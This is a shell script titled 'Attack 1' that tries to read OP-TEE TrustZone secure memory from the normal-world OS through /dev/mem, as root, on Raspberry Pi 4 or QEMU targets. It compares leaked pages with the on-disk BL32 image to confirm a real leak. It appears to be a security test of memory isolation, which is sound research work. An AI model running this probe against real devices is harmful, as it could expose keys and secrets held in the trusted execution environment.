#!/bin/sh
# Attack 1: Read OP-TEE secure memory from the REE via /dev/mem.
# Run as root in the normal world.

set -u

OUT=/tmp/attack1_result.txt

# Choose whether to target the QEMU secure memory regions or RPi4 ones.
TARGET="${1:-}"
if [ -z "$TARGET" ]; then
	printf 'Select target [rpi4/qemu]: '
	read TARGET
fi

case "$TARGET" in
	rpi4|RPi4)
		TARGET=rpi4
		SECURE="0x10100000 0x10200000 0x10f00000"
		CONTROL="0x00200000"
		VERIFY_FILE="/boot/bl31-bl32.bin"
		;;
	qemu|QEMU)
		TARGET=qemu
		SECURE="0x0e100000 0x0e1b7000 0x0e200000"
		CONTROL="0x40200000"
		VERIFY_FILE=""
		;;
	*)
		echo "Unknown target '$TARGET' (expected rpi4 or qemu)" >&2
		exit 1
		;;
esac

# Page at VERIFY_ADDR is compared against this image to confirm a real leak.
# VERIFY_FILE_SKIP is the BL32 page offset and depends on the build layout.
VERIFY_ADDR="0x10100000"
VERIFY_FILE_SKIP=32

rd_word() {
	if command -v devmem >/dev/null 2>&1; then
		devmem "$1" 32 2>/dev/null || echo BLOCKED
	else
		echo "no-devmem"
	fi
}

# Read a 4 KiB page and classify it: blocked, all-zero, or non-zero (with a dump).
rd_page() {
	addr=$1
	dec=$(printf '%d' "$addr")
	page=$((dec / 4096))
	tmp=$(mktemp 2>/dev/null || echo /tmp/pg.$$)
	if dd if=/dev/mem bs=4096 skip="$page" count=1 of="$tmp" 2>/dev/null; then
		got=$(wc -c < "$tmp")
		if [ "$got" -eq 0 ]; then
			echo "READ-FAILED (0 bytes - blocked/fault)"
		else
			nz=$(tr -d '\000' < "$tmp" | wc -c | tr -d ' ')
			if [ "$nz" -eq 0 ]; then
				echo "ALL-ZERO ($got bytes, no data leaked)"
			else
				echo "NON-ZERO"
				echo "    first bytes:"
				xxd "$tmp" 2>/dev/null | head -4 | sed 's/^/    /'
			fi
		fi
	else
		echo "DD-FAILED (open/read denied)"
	fi
	rm -f "$tmp"
}

# Compare the live page against the on-disk secure image. An unbacked address
# returns all-ones and still looks non-zero, so a byte match is what proves the
# read is genuine secure content.
verify_match() {
	addr=$1; file=$2; fskip=$3
	mpage=$(( $(printf '%d' "$addr") / 4096 ))

	if [ ! -r "$file" ]; then
		echo "  verify: cannot read $file - skipping"
		return
	fi

	a=$(mktemp 2>/dev/null || echo /tmp/va.$$)
	b=$(mktemp 2>/dev/null || echo /tmp/vb.$$)

	if ! dd if=/dev/mem bs=4096 skip="$mpage" count=1 of="$a" 2>/dev/null; then
		echo "  verify: /dev/mem read at $addr failed"
		rm -f "$a" "$b"; return
	fi
	dd if="$file" bs=4096 skip="$fskip" count=1 of="$b" 2>/dev/null

	echo "  live  /dev/mem @ $addr (page $mpage):"
	od -An -tx1 "$a" 2>/dev/null | head -2 | sed 's/^/    /'
	echo "  disk  $file (page $fskip):"
	od -An -tx1 "$b" 2>/dev/null | head -2 | sed 's/^/    /'

	if command -v cmp >/dev/null 2>&1; then
		if cmp -s "$a" "$b"; then
			echo "  => MATCH: read equals on-disk secure image"
		else
			echo "  => NO MATCH: pages differ"
		fi
	else
		if [ "$(od -An -tx1 "$a" 2>/dev/null)" = "$(od -An -tx1 "$b" 2>/dev/null)" ]; then
			echo "  => MATCH: read equals on-disk secure image"
		else
			echo "  => NO MATCH: pages differ"
		fi
	fi

	rm -f "$a" "$b"
}

{
	echo "---- CONTROL: non-secure memory (expected to succeed) ----------"
	for a in $CONTROL; do
		echo "  $a  word=$(rd_word "$a")  page=$(rd_page "$a")"
	done
	echo

	echo "---- TARGET: OP-TEE secure regions (expected to fail) ----"
	for a in $SECURE; do
		echo "  $a  word=$(rd_word "$a")  page=$(rd_page "$a")"
	done
	echo

	echo "---- VERIFY: leaked page vs on-disk secure image ----"
	if [ -n "$VERIFY_FILE" ]; then
		verify_match "$VERIFY_ADDR" "$VERIFY_FILE" "$VERIFY_FILE_SKIP"
	else
		echo "  (verification is RPi4-only; skipped for target '$TARGET')"
	fi
	echo

} 2>&1 | tee "$OUT"

echo; echo "Saved to: $OUT"
